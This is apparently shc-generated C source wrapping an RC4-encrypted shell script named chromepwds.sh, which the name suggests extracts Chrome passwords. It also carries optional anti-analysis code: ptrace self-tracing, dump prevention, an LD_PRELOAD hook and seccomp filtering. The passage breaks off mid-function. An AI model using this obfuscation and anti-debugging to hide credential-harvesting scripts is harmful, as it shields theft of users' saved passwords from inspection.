#if 0
	shc Version 4.0.3, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -o /home/quebid/bin/chromepwds -f ./chromepwds.sh 
#endif

static  char data [] = 
#define      rlax_z	1
#define      rlax	((&data[0]))
	"\112"
#define      shll_z	10
#define      shll	((&data[2]))
	"\265\041\047\254\267\223\260\013\116\200\123\034"
#define      opts_z	1
#define      opts	((&data[13]))
	"\051"
#define      chk1_z	22
#define      chk1	((&data[16]))
	"\075\346\310\325\036\023\355\346\312\043\053\103\361\267\230\251"
	"\042\354\164\046\052\240\244\006\004\041"
#define      msg2_z	19
#define      msg2	((&data[44]))
	"\165\263\201\100\105\041\012\227\233\027\243\225\201\323\256\001"
	"\107\247\274\101\106\173\312\023\275\367"
#define      text_z	3086
#define      text	((&data[338]))
	"\155\310\055\251\116\266\137\153\200\021\314\015\170\106\113\137"
	"\113\154\351\047\010\137\332\212\237\356\110\227\246\242\314\023"
	"\153\372\275\272\260\035\045\061\056\361\076\247\070\211\006\203"
	"\366\360\252\376\120\205\211\357\163\321\207\032\164\123\055\337"
	"\115\353\231\376\010\276\057\067\260\156\336\351\370\344\154\356"
	"\325\027\355\045\235\166\025\021\110\234\053\274\360\131\234\076"
	"\104\065\074\115\364\154\204\245\332\142\216\322\107\373\300\035"
	"\022\256\102\260\044\130\301\155\364\355\052\345\106\306\043\213"
	"\373\137\331\360\314\135\225\246\300\043\171\010\036\071\045\061"
	"\347\150\342\014\300\243\172\265\220\244\232\327\152\275\143\146"
	"\035\074\126\352\231\353\220\132\017\011\143\056\103\210\140\053"
	"\361\102\070\261\346\262\147\167\126\002\116\301\277\261\047\335"
	"\355\176\307\207\152\130\342\171\142\105\247\245\316\010\320\277"
	"\112\011\161\060\273\330\247\022\332\366\323\232\250\373\170\225"
	"\171\100\035\343\231\000\135\373\105\005\241\024\015\162\323\127"
	"\173\105\210\066\035\060\110\370\046\034\223\316\027\014\144\221"
	"\115\202\165\346\202\323\341\310\330\203\334\345\365\257\075\160"
	"\207\313\155\254\111\226\335\137\070\231\342\341\162\263\221\361"
	"\066\332\222\026\330\071\136\220\125\000\047\103\330\061\147\356"
	"\205\307\262\034\322\151\322\334\172\302\306\062\006\044\174\173"
	"\134\161\342\367\031\225\127\214\034\311\351\166\331\157\250\257"
	"\132\250\303\015\370\303\015\121\222\034\066\313\041\326\044\067"
	"\345\327\224\332\232\360\040\167\260\047\016\160\064\233\134\275"
	"\126\141\146\026\161\004\007\103\333\361\304\371\125\103\237\352"
	"\304\247\226\207\003\243\375\134\333\143\334\245\007\216\161\231"
	"\234\117\370\066\054\062\114\211\253\266\370\271\066\024\274\105"
	"\106\235\030\276\002\271\311\203\156\000\153\267\041\336\117\163"
	"\336\000\235\372\112\006\366\340\336\005\323\275\364\023\143\207"
	"\366\204\041\231\305\130\234\156\157\272\304\062\122\127\205\354"
	"\350\174\335\145\277\212\256\313\274\372\046\162\000\272\261\174"
	"\375\210\076\223\040\013\066\222\143\224\060\041\311\104\101\231"
	"\001\263\131\335\111\245\103\246\015\275\242\125\136\325\175\145"
	"\303\362\337\142\364\064\263\155\303\344\336\051\243\333\130\236"
	"\325\223\157\252\153\123\277\135\352\271\032\163\241\072\042\125"
	"\003\330\230\203\167\104\206\377\005\163\153\106\063\301\272\015"
	"\106\075\261\314\140\125\046\064\010\035\054\354\155\142\146\164"
	"\060\014\021\021\303\323\003\327\147\314\100\365\370\236\034\244"
	"\031\044\311\167\101\235\137\200\132\136\166\146\170\243\070\071"
	"\204\023\301\334\035\126\227\313\150\207\047\165\217\122\350\353"
	"\233\153\264\317\366\043\123\257\035\070\361\115\113\246\237\106"
	"\231\014\276\143\214\100\135\213\030\222\004\111\044\222\131\215"
	"\233\126\364\353\326\136\315\062\323\137\034\371\027\247\052\073"
	"\075\104\236\342\016\335\007\237\212\072\327\376\144\367\116\107"
	"\143\073\056\063\011\251\031\306\012\135\057\103\372\053\340\273"
	"\315\266\007\255\023\332\267\273\306\056\314\217\045\336\034\005"
	"\265\215\354\247\053\012\150\207\035\275\151\073\122\247\375\263"
	"\226\233\201\017\077\037\164\022\337\251\062\052\326\212\274\125"
	"\246\102\217\105\322\153\274\361\315\372\270\076\263\367\031\037"
	"\253\300\357\146\374\150\055\127\207\245\376\242\063\165\106\162"
	"\364\236\101\135\132\041\012\026\022\174\062\217\267\024\175\377"
	"\030\104\305\035\127\254\025\313\000\356\131\116\030\355\210\126"
	"\064\154\176\144\307\310\301\211\032\100\266\035\112\076\374\304"
	"\041\063\115\223\346\305\132\153\274\110\347\261\323\255\374\022"
	"\377\175\217\122\125\204\126\273\103\077\373\153\311\271\333\047"
	"\027\012\357\351\006\146\147\124\212\205\171\121\113\275\161\337"
	"\160\075\063\102\055\027\126\152\205\073\135\117\221\114\107\323"
	"\350\232\345\170\007\017\270\160\252\165\336\241\365\036\207\074"
	"\227\367\240\260\026\104\150\153\232\071\221\335\261\277\047\317"
	"\016\154\305\107\227\020\216\157\371\320\333\042\075\203\272\102"
	"\232\012\323\041\233\204\121\133\245\052\150\131\147\014\307\255"
	"\211\007\172\034\004\100\014\251\304\330\346\331\311\002\061\265"
	"\031\100\166\346\074\035\156\236\345\000\356\347\171\037\100\124"
	"\053\354\341\313\260\255\333\123\255\116\264\143\272\255\334\037"
	"\133\300\262\271\311\322\165\336\223\316\012\363\360\266\151\273"
	"\146\012\060\057\241\052\027\307\152\236\021\020\233\222\157\336"
	"\011\060\110\173\340\314\172\101\344\077\045\315\131\340\260\061"
	"\127\321\025\331\172\120\175\261\176\311\356\166\263\367\171\203"
	"\331\072\315\150\146\264\240\022\230\214\316\125\303\100\010\226"
	"\100\236\366\104\221\372\355\261\302\126\253\101\336\050\054\217"
	"\112\000\114\145\372\311\373\134\066\007\016\114\160\155\143\063"
	"\120\152\261\110\244\267\175\230\344\002\147\136\235\140\240\326"
	"\175\214\377\275\106\027\056\167\056\074\036\270\131\031\113\242"
	"\034\243\375\350\045\027\301\103\164\377\242\041\352\327\256\116"
	"\321\244\041\230\343\076\043\365\045\376\270\261\360\231\324\243"
	"\112\236\012\155\055\251\333\000\321\131\327\367\035\356\061\254"
	"\156\261\301\011\206\067\050\025\204\221\160\201\164\173\241\340"
	"\040\356\372\352\163\016\317\160\203\265\177\171\125\357\030\010"
	"\304\026\377\205\163\235\362\315\336\271\227\332\160\111\050\016"
	"\204\133\124\215\101\372\106\263\026\127\322\043\170\336\331\102"
	"\234\302\155\220\141\161\254\165\142\167\163\077\246\107\363\122"
	"\063\113\275\336\247\115\325\005\021\007\043\357\357\027\022\276"
	"\215\362\207\325\136\176\026\325\015\336\235\142\155\000\160\177"
	"\124\153\132\174\176\146\321\047\242\014\356\142\142\303\041\144"
	"\116\006\062\254\271\310\054\105\263\100\312\330\220\362\131\354"
	"\016\144\164\343\264\120\301\066\310\033\221\332\270\336\115\234"
	"\354\021\201\373\337\061\222\360\056\141\210\252\005\241\370\273"
	"\026\153\103\324\160\355\040\201\165\000\135\357\020\274\350\334"
	"\125\322\046\042\321\135\250\131\220\026\106\303\106\165\263\373"
	"\237\311\340\376\315\057\042\236\302\073\114\032\377\314\256\375"
	"\206\225\012\211\036\225\250\334\112\106\264\243\062\306\265\074"
	"\051\345\011\353\132\304\004\063\003\257\157\353\034\003\037\265"
	"\032\340\116\110\253\044\372\162\301\057\244\263\125\112\265\312"
	"\067\162\342\267\020\362\044\033\261\267\055\266\267\276\342\312"
	"\072\264\137\030\235\315\176\107\274\144\232\354\257\214\047\173"
	"\245\033\224\027\324\141\114\236\367\062\300\121\235\350\171\106"
	"\157\353\370\034\270\274\033\173\155\126\370\222\205\373\231\205"
	"\126\250\341\040\316\062\142\354\305\253\276\065\221\344\342\004"
	"\006\264\127\371\164\014\077\365\161\172\223\057\167\170\232\025"
	"\302\327\234\061\154\242\176\014\247\234\215\064\044\033\256\374"
	"\235\057\344\154\274\115\241\305\042\320\117\116\074\147\002\272"
	"\151\225\042\356\001\021\117\203\133\170\113\311\212\351\023\102"
	"\153\251\102\144\273\143\257\122\044\223\221\333\260\140\307\052"
	"\330\226\106\310\013\003\015\277\235\072\217\320\202\250\047\245"
	"\150\276\273\040\235\013\004\325\233\166\235\313\076\121\366\133"
	"\011\177\061\257\013\155\105\050\071\355\076\332\250\354\237\350"
	"\244\201\244\312\344\150\135\136\205\054\164\324\301\026\270\372"
	"\201\004\110\230\013\052\371\326\123\326\124\322\013\057\345\066"
	"\224\006\041\156\061\156\355\136\243\070\061\253\223\311\146\365"
	"\141\035\322\022\352\232\375\021\140\105\115\115\041\051\135\020"
	"\322\065\042\356\360\343\224\035\355\122\357\234\344\215\172\111"
	"\334\104\373\054\341\033\164\077\207\000\077\214\207\360\366\211"
	"\314\142\272\040\037\042\363\075\122\175\063\146\026\130\144\365"
	"\066\052\261\070\266\067\000\155\070\103\371\332\320\120\306\072"
	"\303\157\217\000\021\055\012\061\066\110\263\075\103\122\147\320"
	"\371\225\135\137\174\271\117\364\077\313\310\346\330\342\136\314"
	"\303\260\043\316\166\100\240\331\203\306\103\152\232\253\140\353"
	"\255\202\307\013\256\337\076\136\243\263\324\326\117\030\043\127"
	"\070\246\013\251\110\171\010\333\322\211\023\325\130\275\042\141"
	"\234\077\260\003\013\106\124\271\106\012\020\372\202\213\062\123"
	"\362\144\253\330\165\067\223\171\114\011\241\123\330\325\330\324"
	"\064\123\207\265\022\005\066\246\376\210\372\243\314\276\127\135"
	"\033\240\274\250\203\312\251\311\341\352\141\134\013\257\301\212"
	"\064\306\100\111\364\367\246\366\376\157\177\170\245\016\315\006"
	"\177\271\356\353\320\073\121\154\051\236\271\210\223\132\241\316"
	"\007\002\210\153\116\145\102\351\030\206\310\375\260\225\157\022"
	"\137\031\206\336\146\367\161\163\312\176\167\002\106\126\026\117"
	"\027\013\210\100\276\202\366\277\312\150\306\274\071\141\233\162"
	"\322\304\117\240\243\122\165\025\015\260\162\064\122\261\350\335"
	"\374\031\231\263\006\104\067\131\277\127\110\007\143\334\167\041"
	"\234\362\075\043\056\154\054\154\044\011\304\071\243\267\361\216"
	"\177\045\022\164\235\112\330\177\225\003\263\137\132\225\255\373"
	"\326\134\117\206\004\377\157\316\030\177\376\232\143\215\124\320"
	"\242\223\276\345\051\016\007\111\141\026\355\257\310\073\344\134"
	"\317\112\060\263\177\235\022\300\163\360\060\021\227\224\352\306"
	"\143\225\310\227\037\151\234\232\002\242\344\341\377\236\130\174"
	"\311\376\263\307\046\074\164\314\106\032\123\263\073\040\273\304"
	"\361\161\165\307\270\012\155\301\237\007\211\335\075\146\237\143"
	"\127\272\302\172\260\342\007\220\031\305\165\345\001\253\021\203"
	"\337\023\315\302\166\276\000\116\362\027\072\255\273\112\031\104"
	"\144\066\031\130\304\264\211\163\135\036\206\347\042\060\022\004"
	"\140\161\076\240\261\354\224\340\224\322\166\230\021\125\321\225"
	"\251\256\017\071\340\246\356\070\320\012\372\206\023\163\376\362"
	"\262\311\016\016\165\252\242\372\010\171\326\365\162\022\110\035"
	"\344\000\075\104\307\112\244\255\276\320\046\161\200\054\066\250"
	"\327\246\143\077\305\313\031\233\061\054\267\011\133\364\207\027"
	"\321\227\041\304\317\205\375\122\373\030\260\201\132\057\012\052"
	"\355\244\000\140\125\065\063\216\335\263\321\251\113\277\273\254"
	"\342\212\254\321\350\371\204\371\120\227\054\054\202\050\004\016"
	"\076\254\217\264\100\300\265\016\212\373\274\144\020\261\310\370"
	"\075\240\342\327\142\060\122\020\113\327\031\333\367\077\206\300"
	"\315\007\020\257\350\042\165\322\370\364\053\367\126\022\350\244"
	"\136\333\225\316\115\064\135\247\040\113\366\327\006\263\017\326"
	"\126\224\173\344\226\043\267\245\024\326\160\221\073\377\053\014"
	"\107\360\072\154\366\313\114\225\004\334\321\035\376\317\336\345"
	"\172\053\216\163\132\072\270\374\331\070\303\314\316\214\176\356"
	"\034\043\131\333\326\022\065\165\241\042\054\233\017\312\206\076"
	"\154\232\107\360\272\101\032\241\274\027\300\021\013\001\362\020"
	"\012\366\301\314\137\100\026\264\115\373\121\307\117\002\173\054"
	"\130\177\200\141\001\272\041\332\016\361\112\003\261\155\145\326"
	"\062\151\175\302\150\070\323\023\373\237\217\172\036\242\260\023"
	"\144\342\152\042\113\264\343\153\001\044\041\166\260\035\307\050"
	"\373\265\076\243\064\300\057\250\032\125\054\140\041\322\167\055"
	"\357\062\373\243\337\117\144\022\126\024\023\020\124\366\316\313"
	"\115\261\166\324\166\325\060\347\217\054\301\012\270\151\003\171"
	"\216\221\041\017\345\243\325\364\116\027\307\366\003\351\067\146"
	"\064\276\106\312\100\253\372\032\377\324\233\065\313\247\160\100"
	"\117\030\026\267\264\364\271\303\170\275\253\230\252\375\372\034"
	"\106\051\121\176\265\310\341\017\354\302\375\017\377\146\252\237"
	"\273\342\251\011\137\005\104\173\122\341\306\210\255\061\003\276"
	"\100\371\332\330\067\363\177\360\067\112\350\241\357\144\164\237"
	"\337\126\077\350\211\043\156\063\120\056\002\224\150\155\103\212"
	"\002\035\333\021\160\207\235\270\342\012\126\206\240\137\100\040"
	"\037\074\337\022\367\004\330\343\346\160\165\027\335\113\252\344"
	"\171\126\277\227\060\154\250\356\302\335\343\322\335\221\236\376"
	"\305\373\050\357\277\100\234\346\336\314\057\063\307\353\143\304"
	"\243\135\054\261\234\351\323\262\076\121\065\161\375\065\134\325"
	"\100\155\076\225\131\043\307\334\335\265\001\331\046\032\065\170"
	"\062\226\334\024\113\035\033\343\267\354\305\017\270\361\373\223"
	"\020\212\035\171\140\206\273\232\155\211\222\354\343\015\005\051"
	"\243\001\354\027\022\103\243\110\170\067\006\014\363\311\343\330"
	"\345\205\233\134\033\333\215\226\320\361\136\037\137\043\346\330"
	"\224\314\247\302\312\240\015\136\351\327\253\271\102\321\325\005"
	"\011\223\173\233\025\220\175\053\307\130\230\141\247\057\205\066"
	"\254\362\320\163\250\220\107\331\066\022\213\254\002\333\306\261"
	"\114\320\324\072\261\163\257\077\232\213\035\213\241\221\041\024"
	"\167\052\250\334\204\122\071\306\104\235\012\241\310\101\074\066"
	"\247\135\327\207\076\306\107\327\333\132\203\065\062\243\022\346"
	"\005\154\046\246\243\374\272\257\347\167\036\101\011\272\346\157"
	"\014\256\350\363\132\151\260\360\352\365\037\235\140\275\252\153"
	"\377\316\130\123\306\103\036\177\365\374\344\247\041\060\015\103"
	"\056\046\253\211\132\150\350\004\047\214\147\203\101\127\126\314"
	"\275\033\063\366\261\150\251\345\306\210\003\012\030\107\160\121"
	"\224\231\277\002\123\051\015\270\037\102\002\307\115\330\347\154"
	"\256\347\134\163\165\027\357\255\143\333\203\271\041\210\256\320"
	"\021\316\045\223\113\261\243\051\361\175\160\336\324\156\337\214"
	"\150\324\213\210\032\131\351\270\277\224\116\131\050\062\211\021"
	"\130\160\210\322\230\367\161\024\227\322\005\036\035\042\261\143"
	"\001\054\221\212\351\303\124\264\006\262\145\333\377\254\025\154"
	"\015\245\272\253\155\033\023\075\205\014\116\345\203\363\242\202"
	"\237\245\312\347\204\054\071\057\124\142\322\160\266\334\252\333"
	"\156\230\106\011\202\230\005\152\237\153\063\067\056\234\210\315"
	"\145\355\176\367\356\233\225\235\005\254\126\224\367\357\017\042"
	"\220\164\050\060\046\277\133\372\322\021\115\222\041\275\365\154"
	"\222\165\267\324\360\127\303\214\166\317\372\256\104\121\031\140"
	"\221\222\201\016\370\236\161\047\032\263\011\237\120\043\022\155"
	"\163\333\241\117\031\234\351\233\077\205\132\067\033\351\046\106"
	"\070\061\247\154\104\016\335\004\123\173\024\230\006\046\350\345"
	"\145\143\021\137\035\020\230\212\045\053\372\247\154\225\045\125"
	"\264\036\162\044\247\153\174\065\315\253\005\227\031\354\343\313"
	"\307\077\002\152\131\205\077\247\021\101\373\265\123\211\364\305"
	"\247\022\365\357\013\034\014\237\352\043\253\117\265\370\321\053"
	"\337\123\376\301\033\326\104\367\274\071\247\371\252\234\277\121"
	"\257\265\101\272\321\115\132\274\161\005\013\047\376\335\122\335"
	"\061\120\237\115\047\343\105\343\035\355\335\307\211\234\031\070"
	"\121\132\363\043\250\115\337\031\123\353\100\121\311\222\057\372"
	"\343\317\110\012\262\215\356\320\172\313\227\003\150\261\074\272"
	"\013\060\335\263\175\275\315\321\251\016\043\162\240\123\155\204"
	"\042\265\217\324\103\175\244\275\111\074\301\262\356\376\154\371"
	"\056\112\255\254\007\173\175\261\211\241\044\052\364\222\256\026"
	"\107\076\353\213\274\220\111\006\314\013\270\272\011\044\264"
#define      inlo_z	3
#define      inlo	((&data[3585]))
	"\341\012\243"
#define      tst2_z	19
#define      tst2	((&data[3590]))
	"\143\050\134\142\324\001\310\247\374\067\367\267\234\367\172\155"
	"\003\150\333\230\325\147\004\114\221"
#define      chk2_z	19
#define      chk2	((&data[3617]))
	"\016\046\177\372\160\167\372\261\105\031\156\077\003\153\115\066"
	"\272\114\054\155\270\105\020\261"
#define      xecc_z	15
#define      xecc	((&data[3639]))
	"\101\127\122\312\266\010\047\331\273\375\234\336\017\314\144\236"
	"\045\006\371\021"
#define      pswd_z	256
#define      pswd	((&data[3664]))
	"\111\215\051\056\004\007\221\010\315\301\252\365\343\136\136\003"
	"\063\261\005\063\344\314\271\030\307\033\070\077\335\330\155\111"
	"\206\007\316\232\140\214\243\056\115\116\043\060\254\201\064\340"
	"\063\071\023\027\006\314\057\316\347\150\015\304\101\172\016\307"
	"\201\334\141\342\150\005\020\266\123\064\347\377\266\033\337\351"
	"\124\363\000\133\277\060\051\246\231\066\153\332\261\171\242\063"
	"\125\004\025\276\011\046\164\134\132\133\134\020\166\074\372\313"
	"\057\372\047\356\053\121\225\304\207\001\237\071\172\101\154\320"
	"\105\202\217\116\250\003\252\003\137\007\024\326\103\016\242\162"
	"\011\311\141\065\032\366\371\242\370\230\333\163\332\110\103\037"
	"\312\323\155\163\326\030\166\065\040\213\014\143\232\256\326\243"
	"\170\070\330\222\057\322\065\047\153\021\232\105\131\336\144\043"
	"\261\322\227\210\353\016\275\013\231\312\157\063\170\106\327\360"
	"\176\257\203\255\202\271\325\355\312\157\062\043\116\227\107\377"
	"\152\336\207\125\355\105\141\206\017\321\272\210\027\221\170\226"
	"\100\374\104\303\265\031\260\177\211\343\243\327\173\353\327\345"
	"\312\137\073\267\245\235\075\055\156\226\171\000\216\130\101\235"
	"\177\300\227\061\373\041\054\075\170\062\067\212\103\126\121\214"
	"\344\172\272\350\201\114\026\360\342\220\361\161\350\062\016\147"
	"\362\246\230\356\310\305\053\101\367"
#define      lsto_z	1
#define      lsto	((&data[3970]))
	"\371"
#define      msg1_z	65
#define      msg1	((&data[3972]))
	"\235\235\265\072\176\067\344\051\263\132\015\341\007\345\140\150"
	"\155\320\072\335\011\067\322\321\372\075\262\121\206\076\251\164"
	"\171\221\056\370\072\300\224\245\310\054\333\255\004\266\207\024"
	"\215\134\143\320\320\016\311\126\265\141\311\042\075\163\050\162"
	"\325\321\230\201\206\032\315\234\012\260\054\373\041\025\056"
#define      date_z	1
#define      date	((&data[4050]))
	"\304"
#define      tst1_z	22
#define      tst1	((&data[4051]))
	"\222\032\006\265\362\044\111\015\133\317\343\221\262\261\155\034"
	"\376\177\262\044\070\335"/* End of data[] */;
#define      hide_z	4096
#define SETUID 0	/* Define as 1 to call setuid(0) at start of script */
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define HARDENING	0	/* Define as 1 to disable ptrace/dump the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

#if HARDENING
static const char * shc_x[] = {
"/*",
" * Copyright 2019 - Intika <intika@librefox.org>",
" * Replace ******** with secret read from fd 21",
" * Also change arguments location of sub commands (sh script commands)",
" * gcc -Wall -fpic -shared -o shc_secret.so shc_secret.c -ldl",
" */",
"",
"#define _GNU_SOURCE /* needed to get RTLD_NEXT defined in dlfcn.h */",
"#define PLACEHOLDER \"********\"",
"#include <dlfcn.h>",
"#include <stdlib.h>",
"#include <string.h>",
"#include <unistd.h>",
"#include <stdio.h>",
"#include <signal.h>",
"",
"static char secret[128000]; //max size",
"typedef int (*pfi)(int, char **, char **);",
"static pfi real_main;",
"",
"// copy argv to new location",
"char **copyargs(int argc, char** argv){",
"    char **newargv = malloc((argc+1)*sizeof(*argv));",
"    char *from,*to;",
"    int i,len;",
"",
"    for(i = 0; i<argc; i++){",
"        from = argv[i];",
"        len = strlen(from)+1;",
"        to = malloc(len);",
"        memcpy(to,from,len);",
"        // zap old argv space",
"        memset(from,'\\0',len);",
"        newargv[i] = to;",
"        argv[i] = 0;",
"    }",
"    newargv[argc] = 0;",
"    return newargv;",
"}",
"",
"static int mymain(int argc, char** argv, char** env) {",
"    //fprintf(stderr, \"Inject main argc = %d\\n\", argc);",
"    return real_main(argc, copyargs(argc,argv), env);",
"}",
"",
"int __libc_start_main(int (*main) (int, char**, char**),",
"                      int argc,",
"                      char **argv,",
"                      void (*init) (void),",
"                      void (*fini)(void),",
"                      void (*rtld_fini)(void),",
"                      void (*stack_end)){",
"    static int (*real___libc_start_main)() = NULL;",
"    int n;",
"",
"    if (!real___libc_start_main) {",
"        real___libc_start_main = dlsym(RTLD_NEXT, \"__libc_start_main\");",
"        if (!real___libc_start_main) abort();",
"    }",
"",
"    n = read(21, secret, sizeof(secret));",
"    if (n > 0) {",
"      int i;",
"",
"    if (secret[n - 1] == '\\n') secret[--n] = '\\0';",
"    for (i = 1; i < argc; i++)",
"        if (strcmp(argv[i], PLACEHOLDER) == 0)",
"          argv[i] = secret;",
"    }",
"",
"    real_main = main;",
"",
"    return real___libc_start_main(mymain, argc, argv, init, fini, rtld_fini, stack_end);",
"}",
"",
0};
#endif /* HARDENING */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

#if HARDENING

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#define PR_SET_PTRACER 0x59616d61

/* Seccomp Sandboxing Init */
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

#define ArchField offsetof(struct seccomp_data, arch)

#define Allow(syscall) \
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, SYS_##syscall, 0, 1), \
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)

struct sock_filter filter[] = {
    /* validate arch */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, ArchField),
    BPF_JUMP( BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),

    /* load syscall */
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),

    /* list of allowed syscalls */
    Allow(exit_group),  /* exits a process */
    Allow(brk),         /* for malloc(), inside libc */
    Allow(mmap),        /* also for malloc() */
    Allow(munmap),      /* for free(), inside libc */

    /* and if we don't match above, die */
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
};
struct sock_fprog filterprog = {
    .len = sizeof(filter)/sizeof(filter[0]),
    .filter = filter
};

/* Seccomp Sandboxing - Set up the restricted environment */
void seccomp_hardening() {
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("Could not start seccomp:");
        exit(1);
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filterprog) == -1) {
        perror("Could not start seccomp:");
        exit(1);
    }
} 
/* End Seccomp Sandboxing Init */

void shc_x_file() {
    FILE *fp;
    int line = 0;

    if ((fp = fopen("/tmp/shc_x.c", "w")) == NULL ) {exit(1); exit(1);}
    for (line = 0; shc_x[line]; line++)	fprintf(fp, "%s\n", shc_x[line]);
    fflush(fp);fclose(fp);
}

int make() {
	char * cc, * cflags, * ldflags;
    char cmd[4096];

	cc = getenv("CC");
	if (!cc) cc = "cc";

	sprintf(cmd, "%s %s -o %s %s", cc, "-Wall -fpic -shared", "/tmp/shc_x.so", "/tmp/shc_x.c -ldl");
	if (system(cmd)) {remove("/tmp/shc_x.c"); return -1;}
	remove("/tmp/shc_x.c"); return 0;
}

void arc4_hardrun(void * str, int len) {
    //Decode locally
    char tmp2[len];
    char tmp3[len+1024];
    memcpy(tmp2, str, len);

	unsigned char tmp, * ptr = (unsigned char *)tmp2;
    int lentmp = len;
    int pid, status;
    pid = fork();

    shc_x_file();
    if (make()) {exit(1);}

    setenv("LD_PRELOAD","/tmp/shc_x.so",1);

    if(pid==0) {

        //Start tracing to protect from dump & trace
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            kill(getpid(), SIGKILL);
            _exit(1);
        }

        //Decode Bash
        while (len > 0) {
            indx++;
            tmp = stte[indx];
            jndx += tmp;
            stte[indx] = stte[jndx];
            stte[jndx] = tmp;
            tmp += stte[indx];
            *ptr ^= stte[tmp];
            ptr++;
            len--;
        }

        //Do the magic
        sprintf(tmp3, "%s %s", "'********' 21<<<", tmp2);

        //Exec bash script //fork execl with 'sh -c'
        system(tmp2);

        //Empty script variable
        memcpy(tmp2, str, lentmp);

        //Clean temp
        remove("/tmp/shc_x.so");

        //Sinal to detach ptrace
        ptrace(PTRACE_DETACH, 0, 0, 0);
        exit(0);
    }
    else {wait(&status);}

    /* Seccomp Sandboxing - Start */
    seccomp_hardening();

    exit(0);
}
#endif /* HARDENING */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if HARDENING

static void gets_process_name(const pid_t pid, char * name) {
	char procfile[BUFSIZ];
	sprintf(procfile, "/proc/%d/cmdline", pid);
	FILE* f = fopen(procfile, "r");
	if (f) {
		size_t size;
		size = fread(name, sizeof (char), sizeof (procfile), f);
		if (size > 0) {
			if ('\n' == name[size - 1])
				name[size - 1] = '\0';
		}
		fclose(f);
	}
}

void hardening() {
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, -1);

    int pid = getppid();
    char name[256] = {0};
    gets_process_name(pid, name);

    if (   (strcmp(name, "bash") != 0) 
        && (strcmp(name, "/bin/bash") != 0) 
        && (strcmp(name, "sh") != 0) 
        && (strcmp(name, "/bin/sh") != 0) 
        && (strcmp(name, "sudo") != 0) 
        && (strcmp(name, "/bin/sudo") != 0) 
        && (strcmp(name, "/usr/bin/sudo") != 0)
        && (strcmp(name, "gksudo") != 0) 
        && (strcmp(name, "/bin/gksudo") != 0) 
        && (strcmp(name, "/usr/bin/gksudo") != 0) 
        && (strcmp(name, "kdesu") != 0) 
